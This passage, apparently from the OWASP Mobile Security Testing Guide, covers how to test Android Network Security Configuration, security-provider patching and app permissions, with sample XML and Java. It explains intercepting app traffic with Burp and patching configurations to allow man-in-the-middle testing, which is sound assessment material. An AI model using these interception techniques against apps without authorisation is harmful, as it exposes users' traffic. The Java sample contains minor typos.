\subsubsection{Testing the Network Security Configuration Settings
(MSTG-NETWORK-4)}\label{testing-the-network-security-configuration-settings-mstg-network-4}}

\hypertarget{overview-22}{%
\paragraph{Overview}\label{overview-22}}

Network Security Configuration was introduced on Android 7.0 (API level
24) and lets apps customize their network security settings such as
custom trust anchors and certificate pinning.

\hypertarget{trust-anchors}{%
\subparagraph{Trust Anchors}\label{trust-anchors}}

When running on Android 7.0 (API level 24) or higher, apps targeting
those API levels will use a default Network Security Configuration that
doesn't trust any user supplied CAs, reducing the possibility of MITM
attacks by luring users to install malicious CAs.

This protection can be bypassed by using a custom Network Security
Configuration with a custom trust anchor indicating that the app will
trust user supplied CAs.

\hypertarget{static-analysis-30}{%
\paragraph{Static Analysis}\label{static-analysis-30}}

Use a decompiler (e.g.~jadx or apktool) to confirm the target SDK
version. After decoding the the app you can look for the presence of
\texttt{targetSDK} present in the file apktool.yml that was created in
the output folder.

The Network Security Configuration should be analyzed to determine what
settings are configured. The file is located inside the APK in the
/res/xml/ folder with the name network\_security\_config.xml.

If there are custom \texttt{\textless{}trust-anchors\textgreater{}}
present in a \texttt{\textless{}base-config\textgreater{}} or
\texttt{\textless{}domain-config\textgreater{}}, that define a
\texttt{\textless{}certificates\ src="user"\textgreater{}} the
application will trust user supplied CAs for those particular domains or
for all domains. Example:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="utf{-}8"}\KeywordTok{?>}
\KeywordTok{<network{-}security{-}config>}
    \KeywordTok{<base{-}config>}
        \KeywordTok{<trust{-}anchors>}
            \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"system"} \KeywordTok{/>}
            \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"user"} \KeywordTok{/>}
        \KeywordTok{</trust{-}anchors>}
    \KeywordTok{</base{-}config>}
    \KeywordTok{<domain{-}config>}
        \KeywordTok{<domain}\OtherTok{ includeSubdomains=}\StringTok{"false"}\KeywordTok{>}\NormalTok{owasp.org}\KeywordTok{</domain>}
        \KeywordTok{<trust{-}anchors>}
            \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"system"} \KeywordTok{/>}
            \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"user"} \KeywordTok{/>}
        \KeywordTok{</trust{-}anchors>}
        \KeywordTok{<pin{-}set}\OtherTok{ expiration=}\StringTok{"2018/8/10"}\KeywordTok{>}
            \CommentTok{<!{-}{-} Hash of the public key (SubjectPublicKeyInfo of the X.509 certificate) of}
\CommentTok{            the Intermediate CA of the OWASP website server certificate {-}{-}>}
            \KeywordTok{<pin}\OtherTok{ digest=}\StringTok{"SHA{-}256"}\KeywordTok{>}\NormalTok{YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=}\KeywordTok{</pin>}
            \CommentTok{<!{-}{-} Hash of the public key (SubjectPublicKeyInfo of the X.509 certificate) of}
\CommentTok{            the Root CA of the OWASP website server certificate {-}{-}>}
            \KeywordTok{<pin}\OtherTok{ digest=}\StringTok{"SHA{-}256"}\KeywordTok{>}\NormalTok{Vjs8r4z+80wjNcr1YKepWQboSIRi63WsWXhIMN+eWys=}\KeywordTok{</pin>}
        \KeywordTok{</pin{-}set>}
    \KeywordTok{</domain{-}config>}
\KeywordTok{</network{-}security{-}config>}
\end{Highlighting}
\end{Shaded}

Is important to understand the precedence of entries. If a value is not
set in a \texttt{\textless{}domain-config\textbackslash{}\textgreater{}}
entry or in a parent
\texttt{\textless{}domain-config\textbackslash{}\textgreater{}}, the
configurations in place will be based on the
\texttt{\textless{}base-config\textbackslash{}\textgreater{}}, and
lastly if not defined in this entry, the default configuration will be
used.

The default configuration for apps targeting Android 9 (API level 28)
and higher is as follows:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<base{-}config}\OtherTok{ cleartextTrafficPermitted=}\StringTok{"false"}\KeywordTok{>}
    \KeywordTok{<trust{-}anchors>}
        \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"system"} \KeywordTok{/>}
    \KeywordTok{</trust{-}anchors>}
\KeywordTok{</base{-}config>}
\end{Highlighting}
\end{Shaded}

The default configuration for apps targeting Android 7.0 (API level 24)
to Android 8.1 (API level 27) is as follows:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<base{-}config}\OtherTok{ cleartextTrafficPermitted=}\StringTok{"true"}\KeywordTok{>}
    \KeywordTok{<trust{-}anchors>}
        \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"system"} \KeywordTok{/>}
    \KeywordTok{</trust{-}anchors>}
\KeywordTok{</base{-}config>}
\end{Highlighting}
\end{Shaded}

The default configuration for apps targeting Android 6.0 (API level 23)
and lower is as follows:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<base{-}config}\OtherTok{ cleartextTrafficPermitted=}\StringTok{"true"}\KeywordTok{>}
    \KeywordTok{<trust{-}anchors>}
        \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"system"} \KeywordTok{/>}
        \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"user"} \KeywordTok{/>}
    \KeywordTok{</trust{-}anchors>}
\KeywordTok{</base{-}config>}
\end{Highlighting}
\end{Shaded}

\hypertarget{dynamic-analysis-27}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-27}}

You can test the Network Security Configuration settings of a target app
by using a dynamic approach, typically using an interception proxy such
as Burp. However, it might be possible that you're not able to see the
traffic at first, e.g.~when testing an app targeting Android 7.0 (API
level 24) or higher and effectively applying the Network Security
Configuration. In that situation, you should patch the Network Security
Configuration file. You'll find the necessary steps in section
``\href{0x05b-Basic-Security_Testing.md\#bypassing-the-network-security-configuration}{Bypassing
the Network Security Configuration}'' in the ``Android Basic Security
Testing'' chapter.

There might still be scenarios where this is not needed and you can
still do MITM attacks without patching:

\begin{itemize}
\tightlist
\item
  When the app is running on an Android device with Android 7.0 (API
  level 24) onwards, but the app targets API levels below 24, it will
  not use the Network Security Configuration file. Instead, the app will
  still trust any user supplied CAs.
\item
  When the app is running on an Android device with Android 7.0 (API
  level 24) onwards and there is no custom Network Security
  Configuration implemented in the app.
\end{itemize}

\hypertarget{testing-the-security-provider-mstg-network-6}{%
\subsubsection{Testing the Security Provider
(MSTG-NETWORK-6)}\label{testing-the-security-provider-mstg-network-6}}

\hypertarget{overview-23}{%
\paragraph{Overview}\label{overview-23}}

Android relies on a security provider to provide SSL/TLS-based
connections. The problem with this kind of security provider (one
example is
\href{https://www.openssl.org/news/vulnerabilities.html}{OpenSSL}),
which comes with the device, is that it often has bugs and/or
vulnerabilities. To avoid known vulnerabilities, developers need to make
sure that the application will install a proper security provider. Since
July 11, 2016, Google
\href{https://support.google.com/faqs/answer/6376725?hl=en}{has been
rejecting Play Store application submissions} (both new applications and
updates) that use vulnerable versions of OpenSSL.

\hypertarget{static-analysis-31}{%
\paragraph{Static Analysis}\label{static-analysis-31}}

Applications based on the Android SDK should depend on
GooglePlayServices. For example, in the gradle build file, you will find
\texttt{compile\ \textquotesingle{}com.google.android.gms:play-services-gcm:x.x.x\textquotesingle{}}
in the dependencies block. You need to make sure that the
\texttt{ProviderInstaller} class is called with either
\texttt{installIfNeeded} or \texttt{installIfNeededAsync}.
\texttt{ProviderInstaller} needs to be called by a component of the
application as early as possible. Exceptions thrown by these methods
should be caught and handled correctly. If the application cannot patch
its security provider, it can either inform the API of its less secure
state or restrict user actions (because all HTTPS traffic should be
deemed riskier in this situation).

Here are two
\href{https://developer.android.com/training/articles/security-gms-provider.html}{examples
from the Android Developer documentation} that show how to update
Security Provider to prevent SSL exploits. In both cases, the developer
needs to handle the exceptions properly, and reporting to the backend
when the application is working with an unpatched security provider may
be wise.

Patching Synchronously:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//this is a sync adapter that runs in the background, so you can run the synchronous patching.}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ SyncAdapter }\KeywordTok{extends}\NormalTok{ AbstractThreadedSyncAdapter \{}

\NormalTok{  ...}

  \CommentTok{// This is called each time a sync is attempted; this is okay, since the}
  \CommentTok{// overhead is negligible if the security provider is up{-}to{-}date.}
  \AttributeTok{@Override}
  \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onPerformSync}\NormalTok{(Account account, Bundle extras, }\BuiltInTok{String}\NormalTok{ authority,}
\NormalTok{      ContentProviderClient provider, SyncResult syncResult) \{}
    \KeywordTok{try}\NormalTok{ \{}
\NormalTok{      ProviderInstaller.}\FunctionTok{installIfNeeded}\NormalTok{(}\FunctionTok{getContext}\NormalTok{());}
\NormalTok{    \} }\KeywordTok{catch}\NormalTok{ (GooglePlayServicesRepairableException e) \{}

      \CommentTok{// Indicates that Google Play services is out of date, disabled, etc.}

      \CommentTok{// Prompt the user to install/update/enable Google Play services.}
\NormalTok{      GooglePlayServicesUtil.}\FunctionTok{showErrorNotification}\NormalTok{(}
\NormalTok{          e.}\FunctionTok{getConnectionStatusCode}\NormalTok{(), }\FunctionTok{getContext}\NormalTok{());}

      \CommentTok{// Notify the SyncManager that a soft error occurred.}
\NormalTok{      syncResult.}\FunctionTok{stats}\NormalTok{.}\FunctionTok{numIOExceptions}\NormalTok{++;}
      \KeywordTok{return}\NormalTok{;}

\NormalTok{    \} }\KeywordTok{catch}\NormalTok{ (GooglePlayServicesNotAvailableException e) \{}
      \CommentTok{// Indicates a non{-}recoverable error; the ProviderInstaller is not able}
      \CommentTok{// to install an up{-}to{-}date Provider.}

      \CommentTok{// Notify the SyncManager that a hard error occurred.}
      \CommentTok{//in this case: make sure that you inform your API of it.}
\NormalTok{      syncResult.}\FunctionTok{stats}\NormalTok{.}\FunctionTok{numAuthExceptions}\NormalTok{++;}
      \KeywordTok{return}\NormalTok{;}
\NormalTok{    \}}

    \CommentTok{// If this is reached, you know that the provider was already up{-}to{-}date,}
    \CommentTok{// or was successfully updated.}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Patching Asynchronously:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//This is the mainactivity/first activity of the application that\textquotesingle{}s there long enough to make the async installing of the securityprovider work.}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MainActivity }\KeywordTok{extends}\NormalTok{ Activity}
    \KeywordTok{implements}\NormalTok{ ProviderInstaller.}\FunctionTok{ProviderInstallListener}\NormalTok{ \{}

  \KeywordTok{private} \DataTypeTok{static} \DataTypeTok{final} \DataTypeTok{int}\NormalTok{ ERROR\_DIALOG\_REQUEST\_CODE = }\DecValTok{1}\NormalTok{;}

  \KeywordTok{private} \DataTypeTok{boolean}\NormalTok{ mRetryProviderInstall;}

  \CommentTok{//Update the security provider when the activity is created.}
  \AttributeTok{@Override}
  \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onCreate}\NormalTok{(Bundle savedInstanceState) \{}
    \KeywordTok{super}\NormalTok{.}\FunctionTok{onCreate}\NormalTok{(savedInstanceState);}
\NormalTok{    ProviderInstaller.}\FunctionTok{installIfNeededAsync}\NormalTok{(}\KeywordTok{this}\NormalTok{, }\KeywordTok{this}\NormalTok{);}
\NormalTok{  \}}

  \CommentTok{/**}
   \CommentTok{*}\NormalTok{ This method is only called if the provider is successfully updated}
   \CommentTok{*} \CommentTok{(}\NormalTok{or is already up}\CommentTok{{-}}\NormalTok{to}\CommentTok{{-}}\NormalTok{date}\CommentTok{).}
   \CommentTok{*/}
  \AttributeTok{@Override}
  \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onProviderInstalled}\NormalTok{() \{}
    \CommentTok{// Provider is up{-}to{-}date, app can make secure network calls.}
\NormalTok{  \}}

  \CommentTok{/**}
   \CommentTok{*}\NormalTok{ This method is called if updating fails}\CommentTok{;}\NormalTok{ the error code indicates}
   \CommentTok{*}\NormalTok{ whether the error is recoverable}\CommentTok{.}
   \CommentTok{*/}
  \AttributeTok{@Override}
  \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onProviderInstallFailed}\NormalTok{(}\DataTypeTok{int}\NormalTok{ errorCode, Intent recoveryIntent) \{}
    \KeywordTok{if}\NormalTok{ (GooglePlayServicesUtil.}\FunctionTok{isUserRecoverableError}\NormalTok{(errorCode)) \{}
      \CommentTok{// Recoverable error. Show a dialog prompting the user to}
      \CommentTok{// install/update/enable Google Play services.}
\NormalTok{      GooglePlayServicesUtil.}\FunctionTok{showErrorDialogFragment}\NormalTok{(}
\NormalTok{          errorCode,}
          \KeywordTok{this}\NormalTok{,}
\NormalTok{          ERROR\_DIALOG\_REQUEST\_CODE,}
          \KeywordTok{new}\NormalTok{ DialogInterface.}\FunctionTok{OnCancelListener}\NormalTok{() \{}
            \AttributeTok{@Override}
            \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onCancel}\NormalTok{(DialogInterface dialog) \{}
              \CommentTok{// The user chose not to take the recovery action}
              \FunctionTok{onProviderInstallerNotAvailable}\NormalTok{();}
\NormalTok{            \}}
\NormalTok{          \});}
\NormalTok{    \} }\KeywordTok{else}\NormalTok{ \{}
      \CommentTok{// Google Play services is not available.}
      \FunctionTok{onProviderInstallerNotAvailable}\NormalTok{();}
\NormalTok{    \}}
\NormalTok{  \}}

  \AttributeTok{@Override}
  \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onActivityResult}\NormalTok{(}\DataTypeTok{int}\NormalTok{ requestCode, }\DataTypeTok{int}\NormalTok{ resultCode,}
\NormalTok{      Intent data) \{}
    \KeywordTok{super}\NormalTok{.}\FunctionTok{onActivityResult}\NormalTok{(requestCode, resultCode, data);}
    \KeywordTok{if}\NormalTok{ (requestCode == ERROR\_DIALOG\_REQUEST\_CODE) \{}
      \CommentTok{// Adding a fragment via GooglePlayServicesUtil.showErrorDialogFragment}
      \CommentTok{// before the instance state is restored throws an error. So instead,}
      \CommentTok{// set a flag here, which will cause the fragment to delay until}
      \CommentTok{// onPostResume.}
\NormalTok{      mRetryProviderInstall = }\KeywordTok{true}\NormalTok{;}
\NormalTok{    \}}
\NormalTok{  \}}

  \CommentTok{/**}
   \CommentTok{*}\NormalTok{ On resume}\CommentTok{,}\NormalTok{ check to see if we flagged that we need to reinstall the}
   \CommentTok{*}\NormalTok{ provider}\CommentTok{.}
   \CommentTok{*/}
  \AttributeTok{@Override}
  \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onPostResume}\NormalTok{() \{}
    \KeywordTok{super}\NormalTok{.}\FunctionTok{onPostResult}\NormalTok{();}
    \KeywordTok{if}\NormalTok{ (mRetryProviderInstall) \{}
      \CommentTok{// We can now safely retry installation.}
\NormalTok{      ProviderInstall.}\FunctionTok{installIfNeededAsync}\NormalTok{(}\KeywordTok{this}\NormalTok{, }\KeywordTok{this}\NormalTok{);}
\NormalTok{    \}}
\NormalTok{    mRetryProviderInstall = }\KeywordTok{false}\NormalTok{;}
\NormalTok{  \}}

  \KeywordTok{private} \DataTypeTok{void} \FunctionTok{onProviderInstallerNotAvailable}\NormalTok{() \{}
    \CommentTok{// This is reached if the provider cannot be updated for some reason.}
    \CommentTok{// App should consider all HTTP communication to be vulnerable, and take}
    \CommentTok{// appropriate action (e.g. inform backend, block certain high{-}risk actions, etc.).}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Make sure that NDK-based applications bind only to a recent and properly
patched library that provides SSL/TLS functionality.

\hypertarget{dynamic-analysis-28}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-28}}

When you have the source code:

\begin{itemize}
\tightlist
\item
  Run the application in debug mode, then create a breakpoint where the
  app will first contact the endpoint(s).
\item
  Right click the highlighted code and select
  \texttt{Evaluate\ Expression}.
\item
  Type \texttt{Security.getProviders()} and press enter.
\item
  Check the providers and try to find \texttt{GmsCore\_OpenSSL}, which
  should be the new top-listed provider.
\end{itemize}

When you do not have the source code:

\begin{itemize}
\tightlist
\item
  Use Xposed to hook into the \texttt{java.security} package, then hook
  into \texttt{java.security.Security} with the method
  \texttt{getProviders} (with no arguments). The return value will be an
  array of \texttt{Provider}.
\item
  Determine whether the first provider is \texttt{GmsCore\_OpenSSL}.
\end{itemize}

\hypertarget{references-12}{%
\paragraph{References}\label{references-12}}

\hypertarget{owasp-masvs-9}{%
\subparagraph{OWASP MASVS}\label{owasp-masvs-9}}

\begin{itemize}
\tightlist
\item
  MSTG-NETWORK-2: ``The TLS settings are in line with current best
  practices, or as close as possible if the mobile operating system does
  not support the recommended standards.''
\item
  MSTG-NETWORK-3: ``The app verifies the X.509 certificate of the remote
  endpoint when the secure channel is established. Only certificates
  signed by a trusted CA are accepted.''
\item
  MSTG-NETWORK-4: ``The app either uses its own certificate store, or
  pins the endpoint certificate or public key, and subsequently does not
  establish connections with endpoints that offer a different
  certificate or key, even if signed by a trusted CA.''
\item
  MSTG-NETWORK-6: ``The app only depends on up-to-date connectivity and
  security libraries.''
\end{itemize}

\hypertarget{android-developer-documentation}{%
\subparagraph{Android Developer
Documentation}\label{android-developer-documentation}}

\begin{itemize}
\tightlist
\item
  Network Security Config -
  \url{https://developer.android.com/training/articles/security-config}
\item
  Network Security Config (cached alternative) -
  \url{https://webcache.googleusercontent.com/search?q=cache:hOONLxvMTwYJ:https://developer.android.com/training/articles/security-config+\&cd=10\&hl=nl\&ct=clnk\&gl=nl}
\end{itemize}

\hypertarget{xamarin-certificate-pinning}{%
\subparagraph{Xamarin Certificate
Pinning}\label{xamarin-certificate-pinning}}

\begin{itemize}
\tightlist
\item
  Certificate and Public Key Pinning with Xamarin -
  \url{https://thomasbandt.com/certificate-and-public-key-pinning-with-xamarin}
\item
  ServicePointManager -
  \url{https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager(v=vs.110).aspx}
\end{itemize}

\hypertarget{cordova-certificate-pinning}{%
\subparagraph{Cordova Certificate
Pinning}\label{cordova-certificate-pinning}}

\begin{itemize}
\tightlist
\item
  PhoneGap SSL Certificate Checker plugin -
  \url{https://github.com/EddyVerbruggen/SSLCertificateChecker-PhoneGap-Plugin}
\end{itemize}

\hypertarget{android-platform-apis}{%
\subsection{Android Platform APIs}\label{android-platform-apis}}

\hypertarget{testing-app-permissions-mstg-platform-1}{%
\subsubsection{Testing App Permissions
(MSTG-PLATFORM-1)}\label{testing-app-permissions-mstg-platform-1}}

\hypertarget{overview-24}{%
\paragraph{Overview}\label{overview-24}}

Android assigns a distinct system identity (Linux user ID and group ID)
to every installed app. Because each Android app operates in a process
sandbox, apps must explicitly request access to resources and data that
are outside their sandbox. They request this access by declaring the
permissions they need to use system data and features. Depending on how
sensitive or critical the data or feature is, the Android system will
grant the permission automatically or ask the user to approve the
request.

Android permissions are classified into four different categories on the
basis of the protection level they offer:

\begin{itemize}
\tightlist
\item
  \textbf{Normal}: This permission gives apps access to isolated
  application-level features with minimal risk to other apps, the user,
  and the system. For apps targeting Android 6.0 (API level 23) or
  higher, these permissions are granted automatically at installation
  time. For apps targeting a lower API level, the user needs to approve
  them at installation time. Example:
  \texttt{android.permission.INTERNET}.
\item
  \textbf{Dangerous}: This permission usually gives the app control over
  user data or control over the device in a way that impacts the user.
  This type of permission may not be granted at installation time;
  whether the app should have the permission may be left for the user to
  decide. Example: \texttt{android.permission.RECORD\_AUDIO}.
\item
  \textbf{Signature}: This permission is granted only if the requesting
  app was signed with the same certificate used to sign the app that
  declared the permission. If the signature matches, the permission will
  be granted automatically. This permission is granted at installation
  time. Example: \texttt{android.permission.ACCESS\_MOCK\_LOCATION}.
\item
  \textbf{SystemOrSignature}: This permission is granted only to
  applications embedded in the system image or signed with the same
  certificate used to sign the application that declared the permission.
  Example: \texttt{android.permission.ACCESS\_DOWNLOAD\_MANAGER}.
\end{itemize}

A list of all permissions is in the
\href{https://developer.android.com/guide/topics/permissions/overview.html}{Android
developer documentation}.

\hypertarget{android-8.0-api-level-26-changes}{%
\subparagraph{Android 8.0 (API level 26)
Changes}\label{android-8.0-api-level-26-changes}}

The
\href{https://developer.android.com/about/versions/oreo/android-8.0-changes\#atap}{following
changes} affect all apps running on Android 8.0 (API level 26), even to
those apps targeting lower API levels.

\begin{itemize}
\tightlist
\item
  \textbf{Contacts provider usage stats change}: when an app requests
  the
  \href{https://developer.android.com/reference/android/Manifest.permission.html\#READ_CONTACTS}{\texttt{READ\_CONTACTS}}
  permission, queries for contact's usage data will return
  approximations rather than exact values (the auto-complete API is not
  affected by this change).
\end{itemize}

Apps targeting Android 8.0 (API level 26) or higher
\href{https://developer.android.com/about/versions/oreo/android-8.0-changes\#o-apps}{are
affected} by the following:

\begin{itemize}
\item
  \textbf{Account access and discoverability improvements}: Apps can no
  longer get access to user accounts only by having the
  \href{https://developer.android.com/reference/android/Manifest.permission.html\#GET_ACCOUNTS}{\texttt{GET\_ACCOUNTS}}
  permission granted, unless the authenticator owns the accounts or the
  user grants that access.
\item
  \textbf{New telephony permissions}: the following permissions
  (classified as dangerous) are now part of the \texttt{PHONE}
  permissions group:

  \begin{itemize}
  \tightlist
  \item
    The \texttt{ANSWER\_PHONE\_CALLS} permission allows to answer
    incoming phone calls programmatically (via
    \texttt{acceptRingingCall}).
  \item
    The \texttt{READ\_PHONE\_NUMBERS} permission grants read access to
    the phone numbers stored in the device.
  \end{itemize}
\item
  \textbf{Restrictions when granting dangerous permissions}: Dangerous
  permissions are classified into permission groups (e.g.~the
  \texttt{STORAGE} group contains \texttt{READ\_EXTERNAL\_STORAGE} and
  \texttt{WRITE\_EXTERNAL\_STORAGE}). Before Android 8.0 (API level 26),
  it was sufficient to request one permission of the group in order to
  get all permissions of that group also granted at the same time. This
  has changed
  \href{https://developer.android.com/about/versions/oreo/android-8.0-changes\#rmp}{starting
  at Android 8.0 (API level 26)}: whenever an app requests a permission
  at runtime, the system will grant exclusively that specific
  permission. However, note that \textbf{all subsequent requests for
  permissions in that permission group will be automatically granted}
  without showing the permissions dialog to the user. See this example
  from the Android developer documentation:

  \begin{quote}
  Suppose an app lists both READ\_EXTERNAL\_STORAGE and
  WRITE\_EXTERNAL\_STORAGE in its manifest. The app requests
  READ\_EXTERNAL\_STORAGE and the user grants it. If the app targets API
  level 25 or lower, the system also grants WRITE\_EXTERNAL\_STORAGE at
  the same time, because it belongs to the same STORAGE permission group
  and is also registered in the manifest. If the app targets Android 8.0
  (API level 26), the system grants only READ\_EXTERNAL\_STORAGE at that
  time; however, if the app later requests WRITE\_EXTERNAL\_STORAGE, the
  system immediately grants that privilege without prompting the user.
  \end{quote}

  You can see the list of permission groups in the
  \href{https://developer.android.com/guide/topics/permissions/overview.html\#permission-groups}{Android
  developer documentation}. To make this a bit more confusing,
  \href{https://developer.android.com/guide/topics/permissions/overview.html\#perm-groups}{Google
  also warns} that particular permissions might be moved from one group
  to another in future versions of the Android SDK and therefore, the
  logic of the app shouldn't rely on the structure of these permission
  groups. The best practice is to explicitly request every permission
  whenever it's needed.
\end{itemize}

\hypertarget{android-9-api-level-28-changes}{%
\subparagraph{Android 9 (API Level 28)
Changes}\label{android-9-api-level-28-changes}}

The
\href{https://developer.android.com/about/versions/pie/android-9.0-changes-all}{following
changes} affect all apps running on Android 9, even to those apps
targeting API levels lower than 28.

\begin{itemize}
\tightlist
\item
  \textbf{Restricted access to call logs}: \texttt{READ\_CALL\_LOG},
  \texttt{WRITE\_CALL\_LOG}, and \texttt{PROCESS\_OUTGOING\_CALLS}
  (dangerous) permissions are moved from \texttt{PHONE} to the new
  \texttt{CALL\_LOG} permission group. This means that being able to
  make phone calls (e.g.~by having the permissions of the \texttt{PHONE}
  group granted) is not sufficient to get access to the call logs.
\item
  \textbf{Restricted access to phone numbers}: apps wanting to read the
  phone number require the \texttt{READ\_CALL\_LOG} permission when
  running on Android 9 (API level 28).
\item
  \textbf{Restricted access to Wi-Fi location and connection
  information}: SSID and BSSID values cannot be retrieved (e.g.~via
  \href{https://developer.android.com/reference/android/net/wifi/WifiManager\#getConnectionInfo\%28\%29}{\texttt{WifiManager.getConnectionInfo}}
  unless \emph{all} of the following is true:

  \begin{itemize}
  \tightlist
  \item
    The \texttt{ACCESS\_FINE\_LOCATION} or
    \texttt{ACCESS\_COARSE\_LOCATION} permission.
  \item
    The \texttt{ACCESS\_WIFI\_STATE} permission.
  \item
    Location services are enabled (under \textbf{Settings}
    -\textgreater{} \textbf{Location}).
  \end{itemize}
\end{itemize}

Apps targeting Android 9 (API level 28) or higher
\href{https://developer.android.com/about/versions/pie/android-9.0-changes-28}{are
affected} by the following:

\begin{itemize}
\tightlist
\item
  \textbf{Build serial number deprecation}: device's hardware serial
  number cannot be read (e.g.~via
  \href{https://developer.android.com/reference/android/os/Build.html\#getSerial\%28\%29}{\texttt{Build.getSerial}})
  unless the \texttt{READ\_PHONE\_STATE} (dangerous) permission is
  granted.
\end{itemize}

\hypertarget{android-10-changes-beta}{%
\subparagraph{Android 10 Changes (Beta)}\label{android-10-changes-beta}}

Android 10 Beta introduces several
\href{https://developer.android.com/preview/privacy/permissions}{user
privacy enhancements}. The changes regarding permissions affect to all
apps running on Android 10, including those targeting lower API levels.

\begin{itemize}
\tightlist
\item
  \textbf{Restricted access to screen contents}:
  \texttt{READ\_FRAME\_BUFFER}, \texttt{CAPTURE\_VIDEO\_OUTPUT}, and
  \texttt{CAPTURE\_SECURE\_VIDEO\_OUTPUT} permissions are now
  signature-access only, which prevents silent access to the device's
  screen contents.
\item
  \textbf{User-facing permission check on legacy apps}: when running an
  app targeting Android 5.1 (API level 22) or lower for the first time,
  users will be prompted with a permissions screen where they can revoke
  access to specific \emph{legacy permissions} (which previously would
  be automatically granted at installation time).
\end{itemize}

\hypertarget{activity-permission-enforcement}{%
\paragraph{Activity Permission
Enforcement}\label{activity-permission-enforcement}}

Permissions are applied via \texttt{android:permission} attribute within
the \texttt{\textless{}activity\textgreater{}} tag in the manifest.
These permissions restrict which applications can start that Activity.
The permission is checked during \texttt{Context.startActivity} and
\texttt{Activity.startActivityForResult}. Not holding the required
permission results in a \texttt{SecurityException} being thrown from the
call.

\hypertarget{service-permission-enforcement}{%
\paragraph{Service Permission
Enforcement}\label{service-permission-enforcement}}

Permissions applied via \texttt{android:permission} attribute within the
\texttt{\textless{}service\textgreater{}} tag in the manifest restrict
who can start or bind to the associated Service. The permission is
checked during \texttt{Context.startService},
\texttt{Context.stopService} and \texttt{Context.bindService}. Not
holding the required permission results in a \texttt{SecurityException}
being thrown from the call.

\hypertarget{broadcast-permission-enforcement}{%
\paragraph{Broadcast Permission
Enforcement}\label{broadcast-permission-enforcement}}

Permissions applied via \texttt{android:permission} attribute within the
\texttt{\textless{}receiver\textgreater{}} tag restrict access to send
broadcasts to the associated \texttt{BroadcastReceiver}. The held
permissions are checked after \texttt{Context.sendBroadcast} returns,
while trying to deliver the sent broadcast to the given receiver. Not
holding the required permissions doesn't throw an exception, the result
is an unsent broadcast.

A permission can be supplied to \texttt{Context.registerReceiver} to
control who can broadcast to a programmatically registered receiver.
Going the other way, a permission can be supplied when calling
\texttt{Context.sendBroadcast} to restrict which broadcast receivers are
allowed to receive the broadcast.

Note that both a receiver and a broadcaster can require a permission.
When this happens, both permission checks must pass for the intent to be
delivered to the associated target. For more information, please
reference the section
``\href{https://developer.android.com/guide/components/broadcasts\#restrict-broadcasts-permissions}{Restricting
broadcasts with permissions}'' in the Android Developers Documentation.

\hypertarget{content-provider-permission-enforcement}{%
\paragraph{Content Provider Permission
Enforcement}\label{content-provider-permission-enforcement}}

Permissions applied via \texttt{android:permission} attribute within the
\texttt{\textless{}provider\textgreater{}} tag restrict access to data
in a ContentProvider. Content providers have an important additional
security facility called URI permissions which is described next. Unlike
the other components, ContentProviders have two separate permission
attributes that can be set, \texttt{android:readPermission} restricts
who can read from the provider, and \texttt{android:writePermission}
restricts who can write to it. If a ContentProvider is protected with
both read and write permissions, holding only the write permission does
not also grant read permissions.

Permissions are checked when you first retrieve a provider and as
operations are performed using the ContentProvider. Using
\texttt{ContentResolver.query} requires holding the read permission;
using \texttt{ContentResolver.insert}, \texttt{ContentResolver.update},
\texttt{ContentResolver.delete} requires the write permission. A
\texttt{SecurityException} will be thrown from the call if proper
permissions are not held in all these cases.

\hypertarget{content-provider-uri-permissions}{%
\paragraph{Content Provider URI
Permissions}\label{content-provider-uri-permissions}}

The standard permission system is not sufficient when being used with
content providers. For example a content provider may want to limit
permissions to READ permissions in order to protect itself, while using
custom URIs to retrieve information. An application should only have the
permission for that specific URI.

The solution is per-URI permissions. When starting or returning a result
from an activity, the method can set
\texttt{Intent.FLAG\_GRANT\_READ\_URI\_PERMISSION} and/or
\texttt{Intent.FLAG\_GRANT\_WRITE\_URI\_PERMISSION}. This grants
permission to the activity for the specific URI regardless if it has
permissions to access to data from the content provider.

This allows a common capability-style model where user interaction
drives ad-hoc granting of fine-grained permission. This can be a key
facility for reducing the permissions needed by apps to only those
directly related to their behavior. Without this model in place
malicious users may access other member's email attachments or harvest
contact lists for future use via unprotected URIs. In the manifest the
\href{https://developer.android.com/guide/topics/manifest/provider-element\#gprmsn}{\texttt{android:grantUriPermissions}}
attribute or the node help restrict the URIs.

\hypertarget{documentation-for-uri-permissions}{%
\paragraph{Documentation for URI
Permissions}\label{documentation-for-uri-permissions}}

\begin{itemize}
\tightlist
\item
  \href{http://bit.ly/2Ke2AQU}{grantUriPermission}
\item
  \href{http://bit.ly/33ICaP7}{revokeUriPermission}
\item
  \href{http://bit.ly/2q7YGlO}{checkUriPermission}
\end{itemize}

\hypertarget{custom-permissions}{%
\subparagraph{Custom Permissions}\label{custom-permissions}}

Android allows apps to expose their services/components to other apps.
Custom permissions are required for app access to the exposed
components. You can define
\href{https://developer.android.com/guide/topics/permissions/defining.html}{custom
permissions} in \texttt{AndroidManifest.xml} by creating a permission
tag with two mandatory attributes: \texttt{android:name} and
